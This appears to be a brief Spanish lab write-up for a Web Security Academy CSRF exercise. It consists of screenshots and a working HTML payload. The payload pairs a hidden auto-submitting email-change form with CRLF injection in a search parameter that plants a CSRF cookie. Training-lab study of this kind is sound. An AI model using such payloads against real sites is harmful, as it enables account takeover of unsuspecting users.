## Objetivo:

![[Pasted image 20240519202836.png]]

## Solucion:

![[Pasted image 20240519205520.png]]

![[Pasted image 20240519205653.png]]

![[Pasted image 20240519205738.png]]

```
<body>

<form action="https://0aca00b103b5d2ca809dade3002c0083.web-security-academy.net/my-account/change-email" method="post">

<input type="hidden" name="email" value="qwe@gmail.com" />

<input type="hidden" name="csrf" value="iay4jNS3H6icwodfV6N3CsvndGviDikG" />

</form>

  

<img src="https://0aca00b103b5d2ca809dade3002c0083.web-security-academy.net/?search=mibusqueda%0d%0aSet-Cookie:%20csrfKey=xO2d90ph7XmwyXUrGGPdxhiZqWO7xMKk;%20SameSite=None" onerror="document.forms[0].submit()"/>

</body>
```
